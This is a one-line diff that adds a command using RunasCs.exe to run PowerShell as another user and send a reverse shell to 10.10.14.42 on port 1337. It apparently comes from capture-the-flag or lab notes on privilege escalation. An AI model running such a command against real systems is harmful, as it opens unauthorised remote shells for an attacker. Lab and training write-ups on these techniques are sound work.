@@ -1,0 +1,1 @@
+.\RunasCs.exe user password -r 10.10.14.42:1337 powershell
